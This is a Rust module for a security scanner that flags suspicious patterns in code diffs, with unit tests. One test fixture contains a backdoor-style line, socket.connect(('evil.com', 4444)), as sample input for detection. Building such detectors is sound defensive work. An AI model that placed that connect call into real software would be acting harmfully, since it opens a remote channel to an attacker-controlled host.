//! Threat pattern scanner.
//!
//! Scans diffs for suspicious patterns using line-scope and file-scope
//! rules. Line-scope rules match individual added lines; file-scope
//! rules match against full baseline file contents with proximity
//! weighting relative to changed lines.

use indexmap::IndexMap;
use regex::Regex;

use crate::models::diff::{DiffLineType, FileDiff};
use crate::models::finding::Severity;
use crate::security::entropy;

use super::rules::{RuleScope, ThreatCategory, ThreatRule};

// ── Public types ────────────────────────────────────────────────────

/// A single threat match produced by the scanner.
#[derive(Debug, Clone)]
pub struct ThreatMatch {
    /// Rule identifier that matched.
    pub rule_id: String,
    /// Human-readable rule description.
    pub rule_description: String,
    /// Threat category.
    pub category: ThreatCategory,
    /// Severity (may be downgraded for file-scope matches far from changes).
    pub severity: Severity,
    /// File path where the match occurred.
    pub file: String,
    /// 1-based line number of the match.
    pub line_number: u32,
    /// The text that matched the pattern.
    pub matched_text: String,
}

// ── Public API ──────────────────────────────────────────────────────

/// Scan diffs for threat patterns.
///
/// Returns raw `ThreatMatch` values before any LLM triage.
pub fn scan_for_threats(
    diffs: &[FileDiff<'_>],
    file_contents: &IndexMap<String, String>,
    rules: &[ThreatRule],
) -> Vec<ThreatMatch> {
    let mut matches = Vec::new();
    matches.extend(scan_line_scope(diffs, rules));
    matches.extend(scan_file_scope(diffs, file_contents, rules));
    matches
}

// ── Line-scope scanning ─────────────────────────────────────────────

/// Scan individual added lines for threat patterns.
fn scan_line_scope(diffs: &[FileDiff<'_>], rules: &[ThreatRule]) -> Vec<ThreatMatch> {
    let line_rules: Vec<&ThreatRule> = rules
        .iter()
        .filter(|r| r.scope == RuleScope::Line)
        .collect();

    if line_rules.is_empty() {
        return Vec::new();
    }

    let mut matches = Vec::new();

    for diff in diffs {
        if diff.is_binary || diff.is_deleted {
            continue;
        }
        let path = diff.path();
        let ext = file_extension(path);

        for hunk in &diff.hunks {
            for line in &hunk.lines {
                if line.line_type != DiffLineType::Added {
                    continue;
                }
                let content = &line.content;
                let line_no = line.new_line_no.unwrap_or(0);

                for rule in &line_rules {
                    if !language_matches(rule, &ext) {
                        continue;
                    }
                    if !rule.allowlist_paths.is_empty()
                        && path_matches_any_glob(path, &rule.allowlist_paths)
                    {
                        continue;
                    }
                    if !keyword_matches(&rule.keywords, content) {
                        continue;
                    }

                    for m in rule.compiled_regex.find_iter(content) {
                        let matched_text = m.as_str();

                        if rule.entropy_threshold > 0.0 {
                            let ent = entropy::shannon_entropy(matched_text);
                            if ent < rule.entropy_threshold {
                                continue;
                            }
                        }
                        if rule.min_match_length > 0 && matched_text.len() < rule.min_match_length {
                            continue;
                        }

                        // Check allowlist regexes against the full line
                        if rule.allowlist_regexes.iter().any(|re| re.is_match(content)) {
                            continue;
                        }

                        matches.push(ThreatMatch {
                            rule_id: rule.id.clone(),
                            rule_description: rule.description.clone(),
                            category: rule.category,
                            severity: rule.severity,
                            file: path.to_string(),
                            line_number: line_no,
                            matched_text: matched_text.to_string(),
                        });
                    }
                }
            }
        }
    }

    matches
}

// ── File-scope scanning ─────────────────────────────────────────────

/// Scan full file contents for threat patterns, with proximity weighting.
fn scan_file_scope(
    diffs: &[FileDiff<'_>],
    file_contents: &IndexMap<String, String>,
    rules: &[ThreatRule],
) -> Vec<ThreatMatch> {
    let file_rules: Vec<&ThreatRule> = rules
        .iter()
        .filter(|r| r.scope == RuleScope::File)
        .collect();

    if file_rules.is_empty() {
        return Vec::new();
    }

    let mut matches = Vec::new();
    let proximity: u32 = 5;

    for diff in diffs {
        if diff.is_binary || diff.is_deleted {
            continue;
        }
        let path = diff.path();

        // Only process files that have at least one added line
        let added_lines = added_line_numbers(diff);
        if added_lines.is_empty() {
            continue;
        }

        let content = match file_contents.get(path) {
            Some(c) => c,
            None => continue,
        };

        let ext = file_extension(path);

        for rule in &file_rules {
            if !language_matches(rule, &ext) {
                continue;
            }
            if !rule.allowlist_paths.is_empty()
                && path_matches_any_glob(path, &rule.allowlist_paths)
            {
                continue;
            }
            if !keyword_matches(&rule.keywords, content) {
                continue;
            }

            for m in rule.compiled_regex.find_iter(content) {
                let matched_text = m.as_str();
                let line_no = line_number_from_offset(content, m.start());

                if rule.entropy_threshold > 0.0 {
                    let ent = entropy::shannon_entropy(matched_text);
                    if ent < rule.entropy_threshold {
                        continue;
                    }
                }
                if rule.min_match_length > 0 && matched_text.len() < rule.min_match_length {
                    continue;
                }

                // Proximity check: full severity if near a changed line,
                // downgrade to info otherwise.
                let severity = if is_near_changed_line(line_no, &added_lines, proximity) {
                    rule.severity
                } else {
                    Severity::Info
                };

                matches.push(ThreatMatch {
                    rule_id: rule.id.clone(),
                    rule_description: rule.description.clone(),
                    category: rule.category,
                    severity,
                    file: path.to_string(),
                    line_number: line_no,
                    matched_text: matched_text.to_string(),
                });
            }
        }
    }

    matches
}

// ── Helpers ─────────────────────────────────────────────────────────

/// Extract file extension (lowercase, without the dot).
fn file_extension(path: &str) -> String {
    std::path::Path::new(path)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase()
}

/// Check if a rule's language filter matches the file extension.
fn language_matches(rule: &ThreatRule, ext: &str) -> bool {
    if rule.languages.is_empty() {
        return true;
    }
    rule.languages.iter().any(|lang| lang == ext)
}

/// Quick keyword prefilter — at least one keyword must appear (case-insensitive).
fn keyword_matches(keywords: &[String], text: &str) -> bool {
    if keywords.is_empty() {
        return true;
    }
    let lower = text.to_lowercase();
    keywords.iter().any(|kw| lower.contains(kw.as_str()))
}

/// Check if a path matches any glob pattern.
fn path_matches_any_glob(path: &str, patterns: &[String]) -> bool {
    patterns.iter().any(|pat| glob_match(pat, path))
}

/// Minimal glob matching: supports `*` (single segment) and `**` (any depth).
fn glob_match(pattern: &str, path: &str) -> bool {
    // Convert glob to regex
    let mut regex_str = String::from("^");
    let mut chars = pattern.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '*' => {
                if chars.peek() == Some(&'*') {
                    chars.next(); // consume second *
                    // Skip optional following /
                    if chars.peek() == Some(&'/') {
                        chars.next();
                    }
                    regex_str.push_str(".*");
                } else {
                    regex_str.push_str("[^/]*");
                }
            }
            '?' => regex_str.push('.'),
            '.' | '+' | '(' | ')' | '{' | '}' | '[' | ']' | '^' | '$' | '|' | '\\' => {
                regex_str.push('\\');
                regex_str.push(c);
            }
            _ => regex_str.push(c),
        }
    }
    regex_str.push('$');

    Regex::new(&regex_str)
        .map(|re| re.is_match(path))
        .unwrap_or(false)
}

/// Collect all new_line_no values from added lines in a diff.
fn added_line_numbers(diff: &FileDiff<'_>) -> Vec<u32> {
    diff.hunks
        .iter()
        .flat_map(|h| &h.lines)
        .filter(|l| l.line_type == DiffLineType::Added)
        .filter_map(|l| l.new_line_no)
        .collect()
}

/// Check if a line number is within `proximity` lines of any changed line.
fn is_near_changed_line(line: u32, changed_lines: &[u32], proximity: u32) -> bool {
    changed_lines
        .iter()
        .any(|&cl| line.abs_diff(cl) <= proximity)
}

/// Convert a byte offset in content to a 1-based line number.
fn line_number_from_offset(content: &str, offset: usize) -> u32 {
    content[..offset].matches('\n').count() as u32 + 1
}

// ── Tests ───────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::diff::{DiffLine, DiffLineType, Hunk};
    use std::borrow::Cow;

    fn make_rule(
        id: &str,
        pattern: &str,
        category: ThreatCategory,
        scope: RuleScope,
    ) -> ThreatRule {
        ThreatRule {
            id: id.to_string(),
            description: format!("Test rule: {id}"),
            category,
            severity: Severity::Warning,
            regex: pattern.to_string(),
            compiled_regex: Regex::new(pattern).unwrap(),
            keywords: vec![],
            languages: vec![],
            scope,
            entropy_threshold: 0.0,
            min_match_length: 0,
            allowlist_regexes: vec![],
            allowlist_paths: vec![],
        }
    }

    fn make_diff_with_added<'a>(path: &str, lines: &[&'a str]) -> FileDiff<'a> {
        let diff_lines: Vec<DiffLine<'a>> = lines
            .iter()
            .enumerate()
            .map(|(i, content)| DiffLine {
                line_type: DiffLineType::Added,
                content: Cow::Borrowed(content),
                old_line_no: None,
                new_line_no: Some(i as u32 + 1),
            })
            .collect();

        FileDiff {
            old_path: path.to_string(),
            new_path: path.to_string(),
            is_new: false,
            is_deleted: false,
            is_rename: false,
            is_binary: false,
            hunks: vec![Hunk {
                old_start: 1,
                old_count: 0,
                new_start: 1,
                new_count: diff_lines.len() as u32,
                header: None,
                lines: diff_lines,
            }],
        }
    }

    #[test]
    fn detects_line_scope_match() {
        let rule = make_rule(
            "js-eval",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        let diff = make_diff_with_added("app.js", &["let x = eval(input);"]);
        let matches = scan_for_threats(&[diff], &IndexMap::new(), &[rule]);
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule_id, "js-eval");
        assert_eq!(matches[0].line_number, 1);
    }

    #[test]
    fn ignores_removed_lines() {
        let rule = make_rule(
            "js-eval",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        let diff = FileDiff {
            old_path: "app.js".to_string(),
            new_path: "app.js".to_string(),
            is_new: false,
            is_deleted: false,
            is_rename: false,
            is_binary: false,
            hunks: vec![Hunk {
                old_start: 1,
                old_count: 1,
                new_start: 1,
                new_count: 0,
                header: None,
                lines: vec![DiffLine {
                    line_type: DiffLineType::Removed,
                    content: Cow::Borrowed("let x = eval(input);"),
                    old_line_no: Some(1),
                    new_line_no: None,
                }],
            }],
        };
        let matches = scan_for_threats(&[diff], &IndexMap::new(), &[rule]);
        assert!(matches.is_empty());
    }

    #[test]
    fn language_filter_works() {
        let mut rule = make_rule(
            "py-exec",
            r"exec\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        rule.languages = vec!["py".to_string()];

        // Should match .py
        let diff_py = make_diff_with_added("app.py", &["exec(code)"]);
        let matches_py = scan_for_threats(&[diff_py], &IndexMap::new(), &[rule.clone()]);
        assert_eq!(matches_py.len(), 1);

        // Should not match .js
        let diff_js = make_diff_with_added("app.js", &["exec(code)"]);
        let matches_js = scan_for_threats(&[diff_js], &IndexMap::new(), &[rule]);
        assert!(matches_js.is_empty());
    }

    #[test]
    fn keyword_prefilter_works() {
        let mut rule = make_rule(
            "eval-kw",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        rule.keywords = vec!["eval".to_string()];

        // Should match: keyword present
        let diff = make_diff_with_added("app.js", &["eval(x)"]);
        let matches = scan_for_threats(&[diff], &IndexMap::new(), &[rule.clone()]);
        assert_eq!(matches.len(), 1);

        // Keyword passes (case-insensitive), but regex is case-sensitive
        // so EVAL( does not match eval\(
        let diff2 = make_diff_with_added("app.js", &["EVAL(x)"]);
        let matches2 = scan_for_threats(&[diff2], &IndexMap::new(), &[rule]);
        assert!(matches2.is_empty(), "case-sensitive regex should not match EVAL");
    }

    #[test]
    fn allowlist_path_suppresses() {
        let mut rule = make_rule(
            "js-eval",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        rule.allowlist_paths = vec!["**/test_*".to_string()];

        let diff = make_diff_with_added("test_app.js", &["eval(x)"]);
        let matches = scan_for_threats(&[diff], &IndexMap::new(), &[rule]);
        assert!(matches.is_empty());
    }

    #[test]
    fn allowlist_regex_suppresses() {
        let mut rule = make_rule(
            "js-eval",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        rule.allowlist_regexes = vec![Regex::new("// nosec").unwrap()];

        let diff = make_diff_with_added("app.js", &["eval(x) // nosec"]);
        let matches = scan_for_threats(&[diff], &IndexMap::new(), &[rule]);
        assert!(matches.is_empty());
    }

    #[test]
    fn entropy_threshold_filters() {
        let mut rule = make_rule(
            "b64-blob",
            r"[A-Za-z0-9+/=]{40,}",
            ThreatCategory::Obfuscation,
            RuleScope::Line,
        );
        rule.entropy_threshold = 4.5;
        rule.min_match_length = 40;

        // Low entropy: repeated pattern
        let low_entropy = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        let diff_low = make_diff_with_added("data.txt", &[low_entropy]);
        let matches_low = scan_for_threats(&[diff_low], &IndexMap::new(), &[rule.clone()]);
        assert!(matches_low.is_empty(), "low entropy should be filtered");

        // High entropy: random-looking
        let high_entropy = "aB3xK9mQ2pL7wR5tY8nU4vC6jH0fE1saB3xK9mQ2pL7wR5";
        let diff_high = make_diff_with_added("data.txt", &[high_entropy]);
        let matches_high = scan_for_threats(&[diff_high], &IndexMap::new(), &[rule]);
        assert!(!matches_high.is_empty(), "high entropy should match");
    }

    #[test]
    fn file_scope_with_proximity() {
        let rule = make_rule(
            "file-pattern",
            r"socket\.connect",
            ThreatCategory::Backdoor,
            RuleScope::File,
        );

        // Create a diff that adds line 3
        let diff = FileDiff {
            old_path: "app.py".to_string(),
            new_path: "app.py".to_string(),
            is_new: false,
            is_deleted: false,
            is_rename: false,
            is_binary: false,
            hunks: vec![Hunk {
                old_start: 3,
                old_count: 0,
                new_start: 3,
                new_count: 1,
                header: None,
                lines: vec![DiffLine {
                    line_type: DiffLineType::Added,
                    content: Cow::Borrowed("socket.connect(('evil.com', 4444))"),
                    old_line_no: None,
                    new_line_no: Some(3),
                }],
            }],
        };

        let mut file_contents = IndexMap::new();
        file_contents.insert(
            "app.py".to_string(),
            "import socket\ns = socket.socket()\nsocket.connect(('evil.com', 4444))\n".to_string(),
        );

        let matches = scan_for_threats(&[diff], &file_contents, &[rule]);
        // The file-scope regex should match in the joined content
        // and the match at line 3 should be near the added line → full severity
        assert!(!matches.is_empty());
        let near_match = matches.iter().find(|m| m.severity == Severity::Warning);
        assert!(
            near_match.is_some(),
            "match near changed line should keep severity"
        );
    }

    #[test]
    fn file_scope_far_from_change_downgrades() {
        let rule = make_rule(
            "file-pattern",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::File,
        );

        // Diff adds line 100, but eval is on line 1
        let diff = FileDiff {
            old_path: "app.py".to_string(),
            new_path: "app.py".to_string(),
            is_new: false,
            is_deleted: false,
            is_rename: false,
            is_binary: false,
            hunks: vec![Hunk {
                old_start: 100,
                old_count: 0,
                new_start: 100,
                new_count: 1,
                header: None,
                lines: vec![DiffLine {
                    line_type: DiffLineType::Added,
                    content: Cow::Borrowed("pass"),
                    old_line_no: None,
                    new_line_no: Some(100),
                }],
            }],
        };

        let mut file_contents = IndexMap::new();
        // eval() on line 1, change on line 100 — far apart
        file_contents.insert("app.py".to_string(), "eval(x)\n".to_string());

        let matches = scan_for_threats(&[diff], &file_contents, &[rule]);
        assert!(!matches.is_empty());
        assert_eq!(
            matches[0].severity,
            Severity::Info,
            "far-from-change match should be downgraded"
        );
    }

    #[test]
    fn binary_files_skipped() {
        let rule = make_rule(
            "js-eval",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        let diff = FileDiff {
            old_path: "image.png".to_string(),
            new_path: "image.png".to_string(),
            is_new: false,
            is_deleted: false,
            is_rename: false,
            is_binary: true,
            hunks: vec![],
        };
        let matches = scan_for_threats(&[diff], &IndexMap::new(), &[rule]);
        assert!(matches.is_empty());
    }

    #[test]
    fn deleted_files_skipped() {
        let rule = make_rule(
            "js-eval",
            r"eval\(",
            ThreatCategory::DangerousApi,
            RuleScope::Line,
        );
        let diff = FileDiff {
            old_path: "app.js".to_string(),
            new_path: "/dev/null".to_string(),
            is_new: false,
            is_deleted: true,
            is_rename: false,
            is_binary: false,
            hunks: vec![Hunk {
                old_start: 1,
                old_count: 1,
                new_start: 0,
                new_count: 0,
                header: None,
                lines: vec![DiffLine {
                    line_type: DiffLineType::Removed,
                    content: Cow::Borrowed("eval(x)"),
                    old_line_no: Some(1),
                    new_line_no: None,
                }],
            }],
        };
        let matches = scan_for_threats(&[diff], &IndexMap::new(), &[rule]);
        assert!(matches.is_empty());
    }
}
